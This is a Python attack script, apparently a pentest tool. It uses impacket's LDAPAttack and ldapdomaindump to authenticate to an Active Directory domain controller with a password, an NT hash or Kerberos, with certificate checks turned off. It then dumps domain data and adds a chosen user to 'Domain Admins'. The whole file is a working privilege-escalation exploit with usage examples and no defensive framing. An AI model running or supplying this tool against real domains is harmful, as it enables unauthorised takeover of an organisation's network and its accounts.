#!/usr/bin/env python3
#
# ADDUser Attack
# fox at dedagroup.it
# Add a lowpriv user into 'Domain Admins' group
#
import ssl
import sys
import ldap3
import argparse
import ldapdomaindump
from ldap3 import Server, Connection, Tls, SASL, KERBEROS
from impacket import version
from impacket import logging
from impacket.examples import logger
from impacket.examples.ntlmrelayx.attacks.ldapattack import LDAPAttack
from impacket.examples.ntlmrelayx.utils.config import NTLMRelayxConfig

print(version.BANNER)

parser = argparse.ArgumentParser(add_help=True, description='ADduser Attack: add a user in Domain Admins group.')
parser.add_argument('-dc', required=True, action='store', metavar='FQDN', help='FQDN or IP_ADDRESS of the Domain Controller')
parser.add_argument('-user', required=True, action='store', metavar='USER', help='username to Escalate')
parser.add_argument('-hashes', action='store', metavar='LMHASH:NTHASH', help='Hash for LDAP auth (instead of password)')

parser.add_argument('identity', action='store', help='domain.ext\\username:password, attacker account with write access to target computer properties (FULL domain name must be used!)')
parser.add_argument('-k', action='store_true', help='If you want to use a Kerberos ticket')

if len(sys.argv) == 1:
    parser.print_help()
    print('\nExample: ./ADduser.py -dc 192.168.0.130 \'calipendula.local\\Administrator:Password123\' -user username')
    print('\nExample: ./ADduser.py -dc dc1.calipendula.local \'calipendula.local\\Administrator -k\' -user username')
    sys.exit(1)

options = parser.parse_args()

c = NTLMRelayxConfig()
c.addcomputer = 'moana'
c.target = options.dc

if options.hashes:
    attackeraccount = options.identity.split(':')
    attackerpassword = ("aad3b435b51404eeaad3b435b51404ee:" + options.hashes.split(":")[1]).upper()

if options.k:
    attackeraccount = options.identity.split(':')

else:
    attackeraccount = options.identity.split(':')
    attackerpassword = attackeraccount[1]

logger.init()
logging.getLogger().setLevel(logging.INFO)
logging.info('Starting ADduser Attack')
logging.info('Initializing LDAP connection to {}'.format(options.dc))

if options.k:
    tls = Tls(validate=ssl.CERT_NONE, version=ssl.PROTOCOL_TLSv1_2)
    serv = Server(options.dc, use_ssl=True, tls=tls, get_info=ldap3.ALL)
    conn = Connection(serv, authentication=SASL, sasl_mechanism=KERBEROS)
    conn.bind()
else:
    tls = Tls(validate=ssl.CERT_NONE, version=ssl.PROTOCOL_TLSv1_2)
    #uncomment to use LDAPS
    #serv = Server(options.dc, use_ssl=True, tls=tls,  get_info=ldap3.ALL)
    serv = Server(options.dc, use_ssl=False, get_info=ldap3.ALL)
    logging.info('Using {} account with password ***'.format(attackeraccount[0]))
    conn = Connection(serv, user=attackeraccount[0], password=attackerpassword, authentication=ldap3.NTLM)
    conn.bind()

logging.info('LDAP bind OK')

domain=attackeraccount[0].split(".")
domainext=domain[1].split('\\')

logging.info('Initializing domainDumper()')
cnf = ldapdomaindump.domainDumpConfig()
cnf.basepath = c.lootdir
dd = ldapdomaindump.domainDumper(serv, conn, cnf)

logging.info('Initializing LDAPAttack()')
la = LDAPAttack(c, conn, attackeraccount[0].replace('\\', '/'))
#usercn=la.addUser("cn=users,dc="+domain[0]+",dc="+domainext[0],dd)
usercn="cn="+options.user+",cn=users,dc="+domain[0]+",dc="+domainext[0]
groupcn="CN=Domain Admins,CN=Users,DC="+domain[0]+",DC="+domainext[0]
print(usercn)
la.addUserToGroup(usercn,dd,groupcn)

